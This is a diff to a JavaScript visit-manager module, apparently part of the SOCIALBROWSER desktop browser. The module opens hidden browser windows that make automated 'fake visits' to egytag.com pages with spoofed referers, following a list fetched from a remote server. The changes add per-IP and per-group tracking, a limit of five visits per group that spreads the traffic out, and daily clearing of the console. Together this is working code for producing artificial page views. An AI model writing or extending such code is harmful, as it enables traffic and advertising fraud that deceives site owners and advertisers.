@@ -11,7 +11,7 @@
     isTest: SOCIALBROWSER.var.core.id.like('*test*'),
     currentIndex: -1,
     sleep: 1000 * 60 * 10,
-    visitOptions: { show: false, timeout: 1000 * 60 * 5, url: 'https://egytag.com/', referer: 'dynamic', proxy: null, partition: null, scroll: true, count: 1 },
+    visitOptions: { show: false, timeout: 1000 * 60 * 5, url: 'https://egytag.com/', referer: 'dynamic', proxy: null, partition: null, scroll: true, count: 1, ip: '127.0.0.1', group: 1000 },
     trackingList: [],
     visitList: [
       { url: 'https://egytag.com/post/random', timeout: 1000 * 60 * 10 },
@@ -118,17 +118,17 @@
       }
     },
     prepareVisits: function () {
-      SOCIALBROWSER.log('visitManager.prepareVisits()');
       SOCIALBROWSER.fetchJson(
         {
           url: SOCIALBROWSER.server_url + '/api/visit_list',
           method: 'GET',
         },
         function (data) {
+          if (data.reset) {
+            SOCIALBROWSER.visitManager.trackingList = [];
+          }
+
           if (data.done && data.list && data.list.length > 0) {
-            if (data.reset) {
-              SOCIALBROWSER.visitManager.trackingList = [];
-            }
             SOCIALBROWSER.visitManager.visitList = [];
             data.list.forEach((v) => {
               SOCIALBROWSER.visitManager.visitList.push(v);
@@ -398,23 +398,27 @@ if (!SOCIALBROWSER.fakeview) {
 let referer_hostname = null;
 let url_hostname = null;
 if (SOCIALBROWSER.fakeview.referer && SOCIALBROWSER.fakeview.referer.url) {
-    referer_hostname = SOCIALBROWSER.url.parse(SOCIALBROWSER.fakeview.referer.url).hostname;
-    url_hostname = SOCIALBROWSER.url.parse(SOCIALBROWSER.fakeview.url).hostname;
+  referer_hostname = SOCIALBROWSER.url.parse(SOCIALBROWSER.fakeview.referer.url).hostname;
+  url_hostname = SOCIALBROWSER.url.parse(SOCIALBROWSER.fakeview.url).hostname;
 }
-if (SOCIALBROWSER.fakeview.hostname && !document.location.hostname.contains(SOCIALBROWSER.fakeview.hostname)) {
-    fnn = __document__ready__1;
-}else if (referer_hostname && document.location.hostname.contains(referer_hostname) && !document.location.hostname.contains(url_hostname)) {
-    fnn = __document__ready__1;
+if (SOCIALBROWSER.fakeview.hostname && document.location.hostname.contains(SOCIALBROWSER.fakeview.hostname)) {
+  fnn = __document__ready__2;
+} else if (url_hostname && document.location.hostname.contains(url_hostname)) {
+  fnn = __document__ready__2;
+} else if (SOCIALBROWSER.fakeview.hostname && !document.location.hostname.contains(SOCIALBROWSER.fakeview.hostname)) {
+  fnn = __document__ready__1;
+} else if (referer_hostname && document.location.hostname.contains(referer_hostname) && !document.location.hostname.contains(url_hostname)) {
+  fnn = __document__ready__1;
 } else {
-    fnn = __document__ready__2;
+  fnn = __document__ready__2;
 }
 
 if (document.readyState !== 'loading') {
-    fnn();
+  fnn();
 } else {
-    document.addEventListener('DOMContentLoaded', () => {
-        fnn();
-    });
+  document.addEventListener('DOMContentLoaded', () => {
+    fnn();
+  });
 }
 `;
     let code_events = `((w) => {
@@ -883,7 +887,7 @@ if (document.readyState !== 'loading') {
     win.webContents.session.setPermissionCheckHandler((webContents, permission) => {
       return false;
     });
-    
+
     if (win.webContents.setWindowOpenHandler) {
       win.webContents.setWindowOpenHandler(({ url, frameName }) => {
         return { action: 'deny' };
@@ -902,31 +906,43 @@ if (document.readyState !== 'loading') {
       }
     }, options.timeout);
   };
+
   SOCIALBROWSER.visitManager.Tracking = function (v) {
-    let t = null;
+    let t = { group_count: 0 };
+    v.guid = v.referer + '---' + v.url + '---' + v.ip + '---' + v.group;
     SOCIALBROWSER.visitManager.trackingList.forEach((track) => {
-      if (track.url == v.url) {
+      if (track.guid == v.guid) {
         track.count++;
-        t = track;
+        t = { ...track, ...t };
+      }
+      if (track.group == v.group && track.ip == v.ip) {
+        t.group_count++;
       }
     });
-    if (!t) {
+    if (!t.guid) {
       t = {
-        url: v.url,
+        guid: v.guid,
         count: 1,
+        group_count: 1,
+        group: v.group,
+        ip: v.ip,
+        ...t,
       };
       SOCIALBROWSER.visitManager.trackingList.push(t);
     }
     return t;
   };
-  SOCIALBROWSER.visitManager.runFakeVisit = function (sleep) {
+
+  SOCIALBROWSER.visitManager.runFakeVisit = function () {
+    SOCIALBROWSER.visitManager.prepareVisits();
     setTimeout(
       () => {
         let v = SOCIALBROWSER.visitManager.randomVisit();
         if (v) {
+          v = { ...SOCIALBROWSER.visitManager.visitOptions, ...v };
           let track = SOCIALBROWSER.visitManager.Tracking(v);
-          if (v.count && v.count < track.count) {
-            SOCIALBROWSER.visitManager.runFakeVisit(1000);
+          if ((v.count && v.count < track.count) || track.group_count > 5) {
+            SOCIALBROWSER.visitManager.runFakeVisit();
           } else {
             SOCIALBROWSER.visitManager.createFakeVisitWindow(v);
           }
@@ -938,13 +954,13 @@ if (document.readyState !== 'loading') {
     );
   };
 
-  SOCIALBROWSER.visitManager.prepareVisits();
   SOCIALBROWSER.visitManager.runFakeVisit();
 
   SOCIALBROWSER.visitManager.startTime = Date.now();
   setInterval(() => {
     if (Date.now() - SOCIALBROWSER.visitManager.startTime > 1000 * 60 * 60 * 24) {
       SOCIALBROWSER.visitManager.trackingList = [];
+      console.clear();
     }
   }, 1000 * 60 * 60);
 })(window);
